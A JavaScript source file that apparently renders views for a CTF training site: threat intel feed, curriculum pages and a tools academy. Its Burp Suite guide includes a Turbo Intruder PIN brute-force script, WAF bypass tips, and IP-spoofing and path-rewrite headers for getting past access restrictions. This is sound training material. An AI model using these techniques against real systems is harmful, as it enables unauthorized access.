          ${(gui.step_by_step && gui.step_by_step.length) ? `
          <div style="margin-top:10px">
            <span style="font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;font-weight:bold">Step-by-Step Visual Walkthrough:</span>
            <ul style="color:#aeb6c5;padding-left:18px;margin-top:6px;line-height:1.8">
              ${gui.step_by_step.map(s => `<li>${esc(s)}</li>`).join('')}
            </ul>
          </div>` : ''}
        </div>` : ''}
      </div>
    </div>`;
  }).join('')}` : '';

  /* ── Section 5: Real-World Case Study ── */
  const caseStudySection = caseStudy ? `
  <div class="section-head"><div><div class="eyebrow">SECTION 05 // REAL-WORLD WARFARE</div><h2>Real-World CTF Case Study</h2>
    <p>${esc(caseStudy.title)}</p></div></div>
  <div class="detail" style="margin-bottom:24px">
    <div class="detail-head"><h3 style="margin:0">${esc(caseStudy.title)}</h3></div>
    <div class="detail-body" style="padding:20px">
      <p style="color:#aeb6c5;margin-bottom:16px;line-height:1.7">${esc(caseStudy.narrative || '')}</p>
      <h4 style="font-family:var(--display);text-transform:uppercase;letter-spacing:.08em;color:var(--cyan);margin-bottom:12px">Step-by-Step Exploitation Sequence</h4>
      <ol style="color:#aeb6c5;padding-left:20px;line-height:1.9">
        ${(caseStudy.steps || []).map(step => `<li style="margin-bottom:6px;border-bottom:1px dashed #1e2333;padding-bottom:6px"><code style="color:var(--green)">${esc(step)}</code></li>`).join('')}
      </ol>
    </div>
  </div>` : '';

  /* ── Section 6: Interactive Terminal Lab ── */
  const labSection = lab ? `
  <div class="section-head">
    <div>
      <div class="eyebrow">SECTION 06 // HANDS-ON RANGE</div>
      <h2>Interactive Serverless Terminal Lab</h2>
      <p>${esc(lab.description || '')}</p>
    </div>
    <span class="tag warn">🏆 Target: ${esc(lab.flag || '')}</span>
  </div>
  <div id="terminal-lab-mount" style="margin-bottom:24px"></div>` : `
  <div class="note warn-note">
    <strong>No Interactive Lab</strong> — Practice the techniques using local tools against authorized targets.
  </div>`;

  return `
  <div class="section-head">
    <div>
      <div class="tag-row">
        <span class="tag accent">${esc(mod.category || '')}</span>
        <span class="tag">${esc(mod.level || '')}</span>
        <span class="tag">${esc(mod.duration || '')}</span>
      </div>
      <h2 style="margin-top:8px">${esc(mod.icon || '')} ${esc(mod.title)}</h2>
    </div>
    <button class="btn outline" data-action="back-to-curriculum">← Back to Curriculum</button>
  </div>
  ${abstractSection}
  ${theorySection}
  ${impactSection}
  ${toolsSection}
  ${caseStudySection}
  ${labSection}`;
}

/* ══════════════════════════════════════════════════════════
 * INTEL VIEW (Live Intel feed)
 * ══════════════════════════════════════════════════════════ */

function intelHTML(intel) {
  if (!intel) return `<div class="section-head"><div><h2>Live Intel</h2><p>Loading...</p></div></div><div class="empty">⏳ Fetching intelligence snapshot...</div>`;

  const sum   = intel.summary   || {};
  const allItems = intel.items  || [];
  const sigs  = intel.topicSignals || [];
  const srcs  = intel.sources   || [];
  const ts    = intel.updatedAt ? new Date(intel.updatedAt).toLocaleString() : 'unknown';
  const tab   = state.intelTab || 'all';
  const q     = (state.intelQuery || '').trim().toLowerCase();

  const filteredItems = allItems.filter(it => {
    if (tab !== 'all' && it.kind !== tab) return false;
    if (!q) return true;
    const str = `${it.title} ${it.summary} ${it.cve || ''} ${it.product || ''} ${it.topic || ''} ${it.source || ''}`.toLowerCase();
    return str.includes(q);
  });

  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">INTELLIGENCE SNAPSHOT // ACTIVE THREAT SIGNALS</div>
      <h2>Live Intel &amp; Threat Dossiers</h2>
      <p>Continuous discovery signals aggregated from CISA KEV, NVD CVE, Project Zero, PortSwigger, The Hacker News, BleepingComputer, tool releases, and GTFOBins. Click any signal to inspect full vulnerability anatomy, attack vectors, MITRE ATT&amp;CK mappings, and defensive detections.</p>
    </div>
    <div>
      <div class="update-pill"><span class="pulse"></span>Updated ${esc(ts)}</div>
    </div>
  </div>
  <div class="intel-kpis">
    <div class="intel-kpi"><span class="num">${sum.kev || 0}</span><span class="label">Known Exploited</span></div>
    <div class="intel-kpi"><span class="num">${sum.vulnerabilities || 0}</span><span class="label">CVEs</span></div>
    <div class="intel-kpi"><span class="num">${sum.releases || 0}</span><span class="label">Tool Releases</span></div>
    <div class="intel-kpi"><span class="num">${allItems.length || sum.signals || 0}</span><span class="label">Total Signals</span></div>
  </div>

  <div class="module-search" style="margin-top:20px;margin-bottom:14px">
    <span>&gt;</span>
    <input id="intelSearch" value="${esc(state.intelQuery || '')}" placeholder="search intelligence signals by CVE, product, title, keyword, or threat vector..." autocomplete="off">
    <span class="cursor">█</span>
  </div>

  <div class="os-tabs" style="margin-bottom:20px">
    ${[
      ['all', 'All Signals (' + allItems.length + ')'],
      ['KEV', 'Known Exploited (' + (sum.kev || 0) + ')'],
      ['CVE', 'CVEs (' + (sum.vulnerabilities || 0) + ')'],
      ['RESEARCH', 'Security Research'],
      ['ADVISORY', 'Advisories & Alerts'],
      ['RELEASE', 'Tool Releases (' + (sum.releases || 0) + ')'],
      ['TECHNIQUE', 'Tactics / GTFOBins']
    ].map(([catKey, label]) => `
      <button class="os-btn${tab === catKey ? ' active' : ''}" data-intel-tab="${catKey}">${label}</button>
    `).join('')}
  </div>

  ${sigs.length ? `
  <div class="section-head" style="margin-top:16px"><div><h2>Topic Signals</h2><p>Curriculum areas with elevated recent activity.</p></div></div>
  <div class="signal-grid">
    ${sigs.slice(0, 9).map(s => `
      <div class="signal-card">
        <strong>${esc(s.topic)}</strong>
        <span>Activity: ${s.count} signals</span>
        <span style="font-size:11px;color:#7e8ea2;margin-top:6px;display:block">${esc(s.reason || '')}</span>
      </div>`).join('')}
  </div>` : ''}

  <div class="section-head" style="margin-top:24px">
    <div>
      <h2>Threat Signals &amp; Advisories</h2>
      <p>Showing ${filteredItems.length} signals. Click "Inspect Threat Dossier" for root cause, attack mechanics, and defense.</p>
    </div>
  </div>
  <div class="intel-list">
    ${filteredItems.slice(0, 60).map(it => `
      <div class="intel-item" style="cursor:pointer" data-open-intel="${esc(it.id)}">
        <div class="kind"><span class="tag ${it.kind==='KEV'?'warn':it.kind==='CVE'?'accent':it.kind==='RESEARCH'?'success':it.kind==='ADVISORY'?'warn':'tag'}">${esc(it.kind)}</span></div>
        <div style="flex:1">
          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px">
            <h3 style="margin:0 0 4px;font-size:15px;color:var(--fg)">${esc(it.title)}</h3>
          </div>
          <p style="color:#aeb6c5;margin:4px 0 8px;font-size:13px;line-height:1.6">${esc(it.summary || '').slice(0, 240)}${(it.summary||'').length > 240 ? '…' : ''}</p>
          <div class="tag-row" style="margin-top:6px;align-items:center">
            <span class="tag">${esc(it.topic || 'General')}</span>
            ${it.severity ? `<span class="tag ${it.severity==='exploited'||it.severity==='critical'?'warn':''}">${esc(it.severity)}</span>` : ''}
            ${it.cve ? `<span class="tag accent">${esc(it.cve)}</span>` : ''}
            <button class="btn outline" data-open-intel="${esc(it.id)}" style="margin-left:auto;font-size:11px;padding:3px 10px">Inspect Threat Dossier →</button>
          </div>
        </div>
        <div class="meta" style="min-width:110px;text-align:right">
          ${it.date ? new Date(it.date).toLocaleDateString() : ''}
          ${it.source ? `<br><span style="font-size:11px;color:var(--muted)">${esc(it.source)}</span>` : ''}
          ${it.sourceUrl ? `<br><a href="${esc(it.sourceUrl)}" target="_blank" rel="noopener" style="font-size:11px" onclick="event.stopPropagation()">→ source</a>` : ''}
        </div>
      </div>`).join('') || '<div class="empty">No intelligence items matched your search filter.</div>'}
  </div>

  <div class="section-head" style="margin-top:28px"><div><h2>Source Feeds &amp; Aggregator Status</h2></div></div>
  <div class="source-status">
    ${srcs.map(s => `
      <div class="source-status-row">
        <b>${esc(s.name)}</b>
        <span style="color:${s.status==='ok'?'var(--green)':'var(--amber)'}">${esc(s.status)} (${s.count} items)</span>
      </div>`).join('')}
  </div>`;
}

/* ── Intelligence loader ─────────────────────────────────── */
async function loadIntel() {
  if (intelLoading || intelCache) return;
  intelLoading = true;
  try {
    const r = await fetch('/data/live-intel.json', { credentials: 'same-origin' });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const json = await r.json();
    /* api/updates.js wraps response as { ok: true, data: {...} } */
    intelCache = (json && json.ok && json.data) ? json.data : json;
  } catch (e) {
    console.warn('Intel fetch failed, using bootstrap:', e);
    intelCache = { status: 'error', summary: {}, items: [], topicSignals: [], sources: [], curriculum: [], notes: [] };
  }
  intelLoading = false;
  render();
}

/* ══════════════════════════════════════════════════════════
 * ALL EXISTING VIEWS (preserved verbatim in logic)
 * ══════════════════════════════════════════════════════════ */

function dashboardHTML() {
  const isCadet = !isAdvancedRole();
  const visibleDomains = isCadet ? domains.filter(d => !(d.id === 'reverse' || d.id === 'pwn')) : domains;
  const solved = state.solved.length, total = challenges.length;
  const heroDomainsText = isCadet
    ? 'foundations, Linux, networking, web, crypto, forensics, OSINT, stego, modern app surfaces, and defender context'
    : 'foundations, Linux, networking, web, crypto, forensics, reverse engineering, pwn, OSINT, stego, modern app surfaces, and defender context';
  return `<div class="hero">
    <div class="hero-main">
      <div class="eyebrow">CTF Atlas / self-paced cyber range</div>
      <h1>Understand the system. Operate the tools. Prove the idea.</h1>
      <p>A pin-to-pin CTF curriculum that fills the gaps between tutorials: ${heroDomainsText} — with safe hands-on practice at every stage.</p>
      <div class="tag-row"><span class="tag accent">offline-friendly</span><span class="tag accent">OS-independent</span><span class="tag success">localStorage progress</span><span class="tag">browser micro-labs</span></div>
      <div class="hero-actions"><button class="btn primary" data-action="goto-path">Start the path</button><button class="btn" data-action="goto-labs">Open micro-labs</button><button class="btn" data-action="goto-domains">Browse domains</button><button class="btn" data-action="goto-curriculum">🎓 Curriculum</button><button class="btn" data-action="goto-tricks">⚡ Tricks &amp; tips</button><button class="btn" data-action="goto-workbench">🛠️ Workbench</button></div>
    </div>
    <div class="hero-side">
      <div><div class="metric-label">Browser lab completion</div><div class="big-number">${solved}/${total}</div><div class="muted">micro-challenges solved</div></div>
      <div><div class="meter"><div style="width:${completion()}%"></div></div><div class="mini-stat"><span>Overall practice</span><strong>${completion()}%</strong></div></div>
    </div>
  </div>
  <div class="section-head"><div><h2>What's inside</h2><p>Designed to prevent the "I know the commands but not the reasoning" problem.</p></div></div>
  <div class="grid cols-4">
    <div class="card"><div class="metric">${visibleDomains.length}</div><div class="metric-label">learning domains</div><p style="margin-top:8px">Each has theory, workflows, practice and source material.</p></div>
    <div class="card"><div class="metric">${isCadet ? '5' : '6'}</div><div class="metric-label">curriculum tracks</div><p style="margin-top:8px">Exploitation curriculum with interactive terminal labs and case studies.</p></div>
    <div class="card"><div class="metric">${total}</div><div class="metric-label">micro-labs</div><p style="margin-top:8px">Local browser drills with instant feedback and saved progress.</p></div>
    <div class="card"><div class="metric">18+</div><div class="metric-label">reference panels</div><p style="margin-top:8px">In-site notes, formulas, workflows and local-practice recipes.</p></div>
  </div>
  <div class="section-head"><div><h2>Recommended route</h2><p>Follow the sequence, but jump directly to a domain whenever you need it.</p></div></div>
  <div class="grid cols-3">
    ${visibleDomains.slice(0,6).map((d,i)=>`<button class="card domain-card" data-domain="${d.id}" style="text-align:left"><div class="domain-icon">${d.icon}</div><div class="card-top"><div><h3>${d.name}</h3><p>${d.summary}</p></div><div class="arrow">→</div></div><div class="tag-row" style="margin-top:10px"><span class="tag">${d.level}</span><span class="tag">${d.duration}</span>${state.completedDomains.includes(d.id)?'<span class="tag success">complete</span>':''}</div></button>`).join('')}
  </div>`;
}

function pathHTML() {
  const isCadet = !isAdvancedRole();
  const visibleDomains = isCadet ? domains.filter(d => !(d.id === 'reverse' || d.id === 'pwn')) : domains;
  return `<div class="section-head"><div><h2>The Atlas learning path</h2><p>Build fundamentals first; then specialize. Each stage is tied to a practical feedback loop.</p></div><div class="tag-row"><span class="tag accent">progress saved locally</span><span class="tag success">session protected</span></div></div>
  <div class="grid cols-2">
    <div class="detail"><div class="detail-head"><h3 style="margin:0 0 4px">Core spine</h3><p style="margin:0;color:var(--muted);font-size:12px">The shortest path from zero to competent CTF problem solving.</p></div><div class="detail-body">${visibleDomains.map((d,i)=>`<div class="path-node" style="padding-bottom:18px"><div class="path-row"><div class="step-badge">${String(i+1).padStart(2,'0')}</div><div class="path-content"><div class="card-top"><div><h3>${d.name}</h3><p>${d.summary}</p></div><button class="icon-btn" data-domain="${d.id}" title="Open domain">→</button></div><div class="bar-small"><span style="width:${state.completedDomains.includes(d.id)?100:0}%"></span></div><div class="tag-row" style="margin-top:8px"><span class="tag">${d.level}</span><span class="tag">${d.duration}</span>${state.completedDomains.includes(d.id)?'<span class="tag success">done</span>':''}</div></div></div></div>`).join('')}</div></div>
    <div class="detail"><div class="detail-head"><h3 style="margin:0 0 4px">How to study a topic</h3><p style="margin:0;color:var(--muted);font-size:12px">Use the same six-step loop for every category.</p></div><div class="detail-body"><div class="grid">${[['1','Define','Write the problem in plain language. What must be true for the flag to appear?'],['2','Model','Draw the data flow, protocol, memory region or trust boundary.'],['3','Observe','Collect the smallest useful evidence with a tool.'],['4','Hypothesize','Choose one explanation and predict what you should see.'],['5','Test','Change one variable. Prefer local, reversible experiments.'],['6','Explain','Write the root cause, proof, impact and defensive lesson.']].map(x=>`<div class="card"><div class="card-top"><span class="tag accent">${x[0]}</span><h3 style="margin:0;flex:1">${x[1]}</h3></div><p style="margin-top:8px">${x[2]}</p></div>`).join('')}</div><div class="note warn-note"><strong>When stuck:</strong> reduce scope. Verify file type. Inspect inputs/outputs. Read the help text. Make a tiny reproducer. Search the exact protocol term, not the whole mystery.</div></div></div>
  </div>`;
}

function modulesHTML(query) {
  const isCadet = !isAdvancedRole();
  const q = normalizeAnswer(query || '');
  const rows = [];
  domains.forEach(d => {
    if (isCadet && (d.id === 'reverse' || d.id === 'pwn')) return;
    d.concepts.forEach((c, i) => rows.push({ d, index: i+1, title: c[0], theory: c[1], practice: c[2], domain: d }));
  });
  const hits = rows.filter(r => !q || normalizeAnswer(r.title + ' ' + r.theory + ' ' + r.practice + ' ' + r.domain.name).includes(q));
  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">KNOWLEDGE MATRIX // ${rows.length} MODULES</div>
      <h2>Learning modules</h2>
      <p>Every concept is readable here before you touch a tool. Open the textbook chapter for exhaustive theory, architecture diagrams, and master command tables.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${rows.length} modules</span>
      <span class="tag">in-site textbook</span>
      <span class="tag">searchable</span>
    </div>
  </div>

  <div class="module-search">
    <span>&gt;</span>
    <input id="moduleSearch" value="${esc(query||'')}" placeholder="search a concept, protocol, technique, or domain" autocomplete="off">
    <span class="cursor">█</span>
  </div>
  <div class="module-count"><span>${hits.length}</span> modules visible</div>
  <div class="module-grid" id="modulesGrid">
    ${hits.map(r => {
      const chId = getChapterForConcept(r.domain.id, r.index, r.title);
      return `
      <article class="card module-card">
        <div class="module-top">
          <span class="tag accent">${r.domain.icon} / ${r.domain.name}</span>
          <span class="tag">M${String(r.index).padStart(2,'0')}</span>
        </div>
        <h3>${esc(r.title)}</h3>
        <p>${esc(r.theory)}</p>
        <div class="module-action">
          <span class="tag">practice</span>
          <span>${esc(r.practice)}</span>
        </div>
        <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
          <button class="btn" data-textbook="${chId}">📖 Read Textbook</button>
          <button class="btn outline" data-domain="${r.domain.id}">Full Path →</button>
        </div>
      </article>`;
    }).join('') || '<div class="empty">No modules matched. Try "HTTP", "XOR", "permissions", or "DNS".</div>'}
  </div>
  <div class="note">
    <strong>Study contract:</strong> Read the concept, reproduce the observation in a safe lab, then explain it without looking at the text.
  </div>`;
}

function domainsHTML() {
  const isCadet = !isAdvancedRole();
  const visibleDomains = isCadet ? domains.filter(d => !(d.id === 'reverse' || d.id === 'pwn')) : domains;
  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">${isCadet ? 'EXPLORATION TRACKS // CORE DOMAINS' : 'ALL DOMAINS // FULL MATRIX'}</div>
      <h2>Domains</h2>
      <p>Every domain follows the same pattern: concept map → workflow → tools → practice → real-world transfer.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${visibleDomains.length} domains</span>
      <span class="tag success">hands-on</span>
    </div>
  </div>
  <div class="grid cols-3">
    ${visibleDomains.map(d => `
      <button class="card domain-card" data-domain="${d.id}" style="text-align:left">
        <div class="domain-icon">${d.icon}</div>
        <div class="card-top">
          <div>
            <h3>${d.name}</h3>
            <p>${d.summary}</p>
          </div>
          <div class="arrow">→</div>
        </div>
        <div class="tag-row" style="margin-top:10px">
          <span class="tag">${d.level}</span>
          <span class="tag">${d.duration}</span>
          ${state.completedDomains.includes(d.id)?'<span class="tag success">complete</span>':''}
        </div>
      </button>`).join('')}
  </div>`;
}

function domainDetailHTML(id) {
  const d = domains.find(x => x.id === id);
  if (!d) return '<div class="empty">Domain not found.</div>';
  return `<div class="section-head"><div><div class="tag-row"><span class="tag accent">${d.level}</span><span class="tag">${d.duration}</span></div><h2 style="margin-top:8px">${d.name}</h2><p>${d.summary}</p></div><button class="btn primary" data-action="complete-domain" data-domain-id="${d.id}">${state.completedDomains.includes(d.id)?'Completed ✓':'Mark complete'}</button></div>
  <div class="grid cols-2">
    ${d.concepts.map((c,i)=>{
      const chId = getChapterForConcept(d.id, i+1, c[0]);
      return `<div class="card">
        <div class="card-top"><span class="tag accent">C${String(i+1).padStart(2,'0')}</span><h3 style="flex:1">${esc(c[0])}</h3></div>
        <p style="margin-top:8px">${esc(c[1])}</p>
        <div class="note" style="margin-top:12px"><strong>Practice:</strong> ${esc(c[2])}</div>
        <button class="btn" data-textbook="${chId}" style="margin-top:12px;width:100%">📖 Read Deep Textbook Chapter</button>
      </div>`;
    }).join('')}
  </div>
  ${d.practice ? `<div class="section-head" style="margin-top:24px"><div><h2>Practice tasks</h2></div></div><div class="grid cols-3">${d.practice.map(p=>`<div class="card"><p>${esc(p)}</p></div>`).join('')}</div>` : ''}`;
}

function toolsHTML() {
  if (!isAdvancedRole()) {
    alert('This field is under development.');
    return '<div class="empty">This field is under development.</div>';
  }
  const os = state.os;
  const tab = state.toolTab || 'overview';

  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">ACADEMY // TOP CTF TOOLS &amp; WORKFLOW MASTERY</div>
      <h2>Master Tool Academy &amp; Command Lab</h2>
      <p>Definitive guides to the top hacking tools (Burp Suite, OWASP ZAP, Ghidra, GDB+GEF, ffuf/DirBuster) from zero to pro, complete with rate-limit bypasses, binary patching, and the 'Quick Flag' decision matrix.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${tools.length} arsenal tools</span>
      <span class="tag success">up-to-date 2026</span>
      <span class="tag warn">ethical lab scope</span>
    </div>
  </div>

  <div class="os-tabs" style="margin-bottom:18px">
    ${[
      ['overview', 'All Tools Arsenal (' + tools.length + ')'],
      ['burp', 'Burp Suite (Community to Pro Master)'],
      ['zap', 'OWASP ZAP Masterclass'],
      ['ghidra', 'Ghidra Reverse Engineering'],
      ['pwn', 'GDB + GEF & Pwntools'],
      ['dirbust', 'Content Discovery (ffuf / Gobuster)'],
      ['quickflag', '🎯 Quick Flag Decision Matrix']
    ].map(([key, label]) => `
      <button class="os-btn${tab === key ? ' active' : ''}" data-tool-tab="${key}">${label}</button>
    `).join('')}
  </div>

  ${tab === 'overview' ? `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
      <p style="color:#aeb6c5;font-size:13px;margin:0">Displaying commands optimized for your operating system:</p>
      <div class="os-tabs" style="margin:0">
        ${['linux','windows','mac'].map(o=>`<button class="os-btn${os===o?' active':''}" data-os="${o}">${o.toUpperCase()}</button>`).join('')}
      </div>
    </div>
    <div class="tool-grid">
      ${tools.map(t=>`
        <div class="tool-card">
          <div class="card-top">
            <h3>${esc(t.name)}</h3>
            <span class="tool-os">${esc(t.cat)}</span>
          </div>
          <p class="why">${esc(t.why)}</p>
          <pre><code>${esc(t[os]||t.linux)}</code></pre>
          <div style="display:flex;gap:8px;margin-top:10px">
            ${t.url ? `<a class="btn outline" href="${esc(t.url)}" target="_blank" rel="noopener" style="font-size:11px;padding:4px 8px">Docs &rarr;</a>` : ''}
            ${t.name.includes('Burp') ? `<button class="btn outline" data-tool-tab="burp" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
            ${t.name.includes('ZAP') ? `<button class="btn outline" data-tool-tab="zap" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
            ${t.name.includes('Ghidra') ? `<button class="btn outline" data-tool-tab="ghidra" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
            ${t.name.includes('GDB') ? `<button class="btn outline" data-tool-tab="pwn" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
            ${t.name.includes('ffuf') ? `<button class="btn outline" data-tool-tab="dirbust" style="font-size:11px;padding:4px 8px">Master Guide &rarr;</button>` : ''}
          </div>
        </div>
      `).join('')}
    </div>
  ` : ''}

  ${tab === 'burp' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">WEB EXPLOITATION</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Burp Suite Community Edition Masterclass (Zero to Pro)</h3>
          <p style="color:#aeb6c5;font-size:13px">How to configure, optimize, and wield Burp Suite Community Edition like a seasoned professional, including cracking rate limits via Turbo Intruder, match & replace automation, and free collaborator alternatives.</p>
        </div>
        <button class="btn" data-textbook="web-start-to-end">📖 Read Web Lifecycle Chapter</button>
      </div>

      <div style="margin:20px 0;background:#0d0f18;border:1px solid var(--border);border-radius:6px;padding:16px">
        <h4 style="color:var(--green);font-size:13px;letter-spacing:0.08em;text-transform:uppercase;margin:0 0 10px">BURP SUITE ARCHITECTURE &amp; INTERCEPT FLOW</h4>
        <pre style="margin:0;color:#cdd6f4"><code>[Browser / Client (FoxyProxy: 127.0.0.1:8080)]
       │
       ▼
[Burp Proxy Listener (Intercept On/Off)]
       │
       ├──► [Scope Filter: Drop noise &amp; telemetry (.google, .mozilla)]
       ├──► [Match &amp; Replace Rules: Inject Bearer Tokens / Spoof IPs]
       │
       ▼
[HTTP History / Target Site Map]
       │
       ├──► Send to [Repeater: Ctrl+R]  --> Manual request modification &amp; fuzzing
       ├──► Send to [Turbo Intruder]     --> 10,000 req/sec rate-limit bypass
       ├──► Send to [Decoder: Ctrl+Shift+D] --> Multi-stage URL/Base64/Hex transforms
       └──► Send to [Comparer]          --> Word &amp; byte diff analysis of responses</code></pre>
      </div>

      <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Stage 1: Setup &amp; Scope Configuration</h4>
          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>FoxyProxy Setup:</strong> Add Firefox extension proxying HTTP/HTTPS traffic to <code>127.0.0.1:8080</code>.</li>
            <li><strong>Install CA Certificate:</strong> Navigate to <code>http://burp/cert</code> in proxied browser, download <code>cacert.der</code>, and import into Firefox under <em>Settings &rarr; Certificates &rarr; Authorities &rarr; Trust this CA</em>.</li>
            <li><strong>Target Scope Hygiene:</strong> Go to <em>Target &rarr; Scope</em>. Add <code>http://target-ctf.com.*</code>. Then in <em>Proxy &rarr; HTTP history</em>, click the filter bar and check <strong>Show only in-scope items</strong>. This removes 95% of background browser telemetry!</li>
          </ol>
        </div>

        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Stage 2: Repeater Like a Pro</h4>
          <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>Essential Hotkeys:</strong> <code>Ctrl+R</code> sends selected request to Repeater. <code>Ctrl+Space</code> sends request immediately.</li>
            <li><strong>Tab Organization:</strong> Double click tab titles to name them: <code>Auth Bypass</code>, <code>SSTI Test</code>, <code>Admin IDOR</code>. Right click to color code tabs.</li>
            <li><strong>HTTP Protocol Downgrade:</strong> If backend WAF blocks requests, toggle <em>Change HTTP protocol</em> to HTTP/1.1 or HTTP/2.</li>
            <li><strong>Chunked Transfer Encoding:</strong> Right click &rarr; <em>Change request method / Chunk transfer</em> to bypass signature-based WAFs.</li>
          </ol>
        </div>
      </div>

      <div class="card" style="margin-bottom:20px">
        <div class="card-top">
          <h4 style="color:var(--green);margin:0">Stage 3: Turbo Intruder (Bypassing Community Edition Throttling)</h4>
          <span class="tag accent">10,000 req/sec</span>
        </div>
        <p style="color:#aeb6c5;font-size:13px;margin:8px 0">Burp Community intentionally throttles Intruder to ~1 request per second. Bypass this completely by installing <strong>Turbo Intruder</strong> from the BApp Store (Extensions &rarr; BApp Store &rarr; Turbo Intruder). It uses custom Python scripts streaming requests over raw sockets.</p>
        <pre><code># Turbo Intruder Python Script Template (Bypass Rate Limits)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=15,
                           requestsPerConnection=100,
                           pipeline=True)
    
    # Brute-force 4-digit PINs (0000 - 9999) in under 3 seconds!
    for i in range(10000):
        engine.queue(target.req, str(i).zfill(4))

def handleResponse(req, interesting):
    # Only show responses that do NOT match failure conditions
    if req.status == 200 and 'Invalid PIN' not in req.response:
        table.add(req)</code></pre>
      </div>

      <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Stage 4: Match &amp; Replace Rules</h4>
          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Proxy &rarr; Proxy Settings &rarr; Match and Replace:</p>
          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>Auto-Inject JWT:</strong> Match: <code>^$</code>, Replace: <code>Authorization: Bearer &lt;TOKEN&gt;</code>.</li>
            <li><strong>Spoof Internal IP:</strong> Add <code>X-Forwarded-For: 127.0.0.1</code> and <code>X-Real-IP: 127.0.0.1</code> to bypass IP restrictions.</li>
            <li><strong>Path Rewriting:</strong> Add <code>X-Original-URL: /admin</code> or <code>X-Rewrite-URL: /admin</code>.</li>
            <li><strong>Strip Security Headers:</strong> Remove <code>Content-Security-Policy</code> to test XSS without CSP blocks.</li>
          </ul>
        </div>

        <div class="card">
          <h4 style="color:var(--green);margin:0 0 8px">Stage 5: Free Out-of-Band (OOB) Testing</h4>
          <p style="color:#aeb6c5;font-size:12px;margin:0 0 8px">Burp Collaborator requires Pro. Use these free tools for blind SSRF/SQLi/XXE:</p>
          <ul style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.6">
            <li><strong>interactsh (Recommended):</strong> Run <code>interactsh-client -v</code> in your terminal. Get a free subdomain receiving DNS, HTTP, and SMTP pings instantly.</li>
            <li><strong>webhook.site:</strong> Instant web-based HTTP request logger.</li>
            <li><strong>requestrepo.com:</strong> Dedicated CTF tool for custom DNS and HTTP responses.</li>
          </ul>
        </div>
      </div>
    </article>
  ` : ''}

  ${tab === 'zap' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">OPEN SOURCE PENTESTING</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">OWASP ZAP (Zed Attack Proxy) Masterclass</h3>
          <p style="color:#aeb6c5;font-size:13px">The premiere open-source web application security scanner. Zero rate limits, powerful automated spidering, scriptable authentication, and the built-in browser HUD.</p>
        </div>
      </div>

      <div class="grid cols-3" style="gap:16px;margin:16px 0">
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">1. Zero-Throttling Fuzzer</h4>
          <p style="font-size:12px;color:#aeb6c5">Unlike Burp Community, ZAP's Fuzzer has <strong>zero commercial throttling</strong>. Highlight any parameter, right click &rarr; Fuzz, select a SecLists wordlist, and fire at 500+ threads simultaneously.</p>
        </div>
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">2. Interactive HUD Overlay</h4>
          <p style="font-size:12px;color:#aeb6c5">ZAP features an in-browser Heads-Up Display (HUD). Test applications directly in Firefox or Chrome with floating panels showing alerts, spidering, and parameter modification.</p>
        </div>
        <div class="card">
          <h4 style="color:var(--green);margin:0 0 6px">3. Automated Headless CI/CD</h4>
          <p style="font-size:12px;color:#aeb6c5">Run headless automated vulnerability sweeps in Docker or CLI during time-constrained tournaments: <code>zap.sh -cmd -quickurl http://target -quickout /tmp/report.html</code>.</p>
        </div>
      </div>

      <div class="card">
        <h4 style="color:var(--green);margin:0 0 8px">Step-by-Step ZAP CTF Workflow</h4>
        <ol style="padding-left:18px;margin:0;color:#cdd6f4;font-size:13px;line-height:1.7">
          <li><strong>Context Definition:</strong> In the Sites tree, right click target domain &rarr; <em>Include in Context &rarr; Default Context</em>.</li>
          <li><strong>Authentication Setup:</strong> Under Session Properties &rarr; Context &rarr; Authentication, select <em>Form-based Authentication</em> or <em>JSON-based Authentication</em>. Define login request and logged-in indicator pattern.</li>
          <li><strong>Spider &amp; Ajax Spider:</strong> Run traditional Spider for static links, followed by Ajax Spider (using headless browser) to crawl JavaScript single-page applications (React/Vue/Angular).</li>
          <li><strong>Active Scan:</strong> Launch Active Scan policy targeting specific vulnerability categories (e.g., High Priority: SQL Injection, Remote Code Execution, Path Traversal).</li>
        </ol>
      </div>
    </article>
  ` : ''}

  ${tab === 'ghidra' ? `
    <article class="writeup-card">
      <div class="card-top">
        <div>
          <span class="tag accent">REVERSE ENGINEERING</span>
          <h3 style="font-size:22px;color:var(--fg);margin:8px 0 4px">Ghidra Reverse Engineering from Scratch to Master</h3>
          <p style="color:#aeb6c5;font-size:13px">NSA's software reverse engineering suite deconstructed: CodeBrowser layout, the 5 essential hotkeys for solving reversing challenges, binary patching, and Z3 SMT keygenning.</p>
        </div>
